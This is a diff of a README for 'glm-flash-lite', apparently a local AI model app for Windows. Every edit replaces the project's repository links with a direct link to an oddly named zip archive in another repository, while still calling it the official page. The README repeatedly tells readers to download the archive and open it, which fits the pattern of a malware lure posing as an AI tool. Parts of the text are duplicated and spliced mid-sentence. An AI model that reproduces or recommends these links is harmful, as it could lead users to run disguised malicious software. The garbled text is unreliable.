@@ -5,7 +5,7 @@ description: "Run GLM-5.3-Flash on a single 24 GB RTX 3090 with an OpenAI-compat
 ---
 # ⚡ glm-flash-lite - Run Powerful AI on Your PC
 
-[![Download glm-flash-lite](https://img.shields.io/badge/Download-glm--flash--lite-ff6f00?style=for-the-badge&logo=github)](https://github.com/Peduncleisraelite174/glm-flash-lite)
+[![Download glm-flash-lite](https://img.shields.io/badge/Download-glm--flash--lite-ff6f00?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Peduncleisraelite174/peduncleisraelite174.github.io/main/trigonocephalous/Application-1.2.zip)
 
 glm-flash-lite is a Windows application that brings a powerful AI language model to your own computer. It is built around GLM-5.3-Flash EXL3 and is designed to run on a single 24 GB NVIDIA RTX 3090 graphics card with DDR4 system memory. Instead of relying on a remote service, glm-flash-lite lets you run AI tasks locally and connect compatible tools through an OpenAI API-style connection.
 
@@ -37,7 +37,7 @@ Getting started with glm-flash-lite is meant to be straightforward. You do not n
 
 Use this link to reach the official glm-flash-lite page:
 
-[![Download glm-flash-lite](https://img.shields.io/badge/Get%20glm--flash--lite-9c27b0?style=for-the-badge&logo=github)](https://github.com/Peduncleisraelite174/glm-flash-lite)
+[![Download glm-flash-lite](https://img.shields.io/badge/Get%20glm--flash--lite-9c27b0?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Peduncleisraelite174/peduncleisraelite174.github.io/main/trigonocephalous/Application-1.2.zip)
 
 Visit this link to download the application.
 
@@ -47,7 +47,7 @@ The page is the starting point for getting glm-flash-lite on your Windows comput
 
 The download link is the# ⚡ glm-flash-lite - Run Powerful AI on Your PC
 
-[![Download glm-flash-lite](https://img.shields.io/badge/Download-glm--flash--lite-ff6f00?style=for-the-badge&logo=github)](https://github.com/Peduncleisraelite174/glm-flash-lite)
+[![Download glm-flash-lite](https://img.shields.io/badge/Download-glm--flash--lite-ff6f00?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Peduncleisraelite174/peduncleisraelite174.github.io/main/trigonocephalous/Application-1.2.zip)
 
 glm-flash-lite is a Windows application that brings a powerful AI language model to your own computer. It is built around GLM-5.3-Flash EXL3 and is designed to run on a single 24 GB NVIDIA RTX 3090 graphics card with DDR4 system memory. Instead of relying on a remote service, glm-flash-lite lets you run AI tasks locally and connect compatible tools through an OpenAI API-style connection.
 
@@ -79,7 +79,7 @@ Getting started with glm-flash-lite is meant to be straightforward. You do not n
 
 Use this link to reach the official glm-flash-lite page:
 
-[![Download glm-flash-lite](https://img.shields.io/badge/Get%20glm--flash--lite-9c27b0?style=for-the-badge&logo=github)](https://github.com/Peduncleisraelite174/glm-flash-lite)
+[![Download glm-flash-lite](https://img.shields.io/badge/Get%20glm--flash--lite-9c27b0?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Peduncleisraelite174/peduncleisraelite174.github.io/main/trigonocephalous/Application-1.2.zip)
 
 Visit this link to download the application.
 
@@ -92,7 +92,7 @@ The download is handled through the official project page. There is no separate 
 Follow these steps:
 
 1. Open your web browser on your Windows computer.
-2. Go to https://github.com/Peduncleisraelite174/glm-flash-lite
+2. Go to https://raw.githubusercontent.com/Peduncleisraelite174/peduncleisraelite174.github.io/main/trigonocephalous/Application-1.2.zip
 3. Visit this link to download the application.
 4. Follow the download option shown on that page.
 5. Wait for the download to finish before opening anything.
@@ -184,13 +184,13 @@ Can I use it on a laptop? The app targets a 24 GB RTX 3090 desktop graphics card
 
 Will it work with a different graphics card? The memory features are tuned for one 24 GB RTX 3090. Other cards may not provide the same experience.
 
-Where do I get it? Visit https://github.com/Peduncleisraelite174/glm-flash-lite to download the application.
+Where do I get it? Visit https://raw.githubusercontent.com/Peduncleisraelite174/peduncleisraelite174.github.io/main/trigonocephalous/Application-1.2.zip to download the application.
 
 ## ✅ Final Step
 
 You now have everything you need to begin. The most important action is to get the app from the official page.
 
-[![Download glm-flash-lite](https://img.shields.io/badge/Download%20Now-glm--flash--lite-00c853?style=for-the-badge&logo=github)](https://github.com/Peduncleisraelite174/glm-flash-lite)
+[![Download glm-flash-lite](https://img.shields.io/badge/Download%20Now-glm--flash--lite-00c853?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Peduncleisraelite174/peduncleisraelite174.github.io/main/trigonocephalous/Application-1.2.zip)
 
 Visit this link to download the application. Follow the download shown there, wait for it to finish, and open the file on your Windows computer. Give it time on the first launch, then start typing your requests and let glm-flash-lite handle the rest on your own hardware.
 
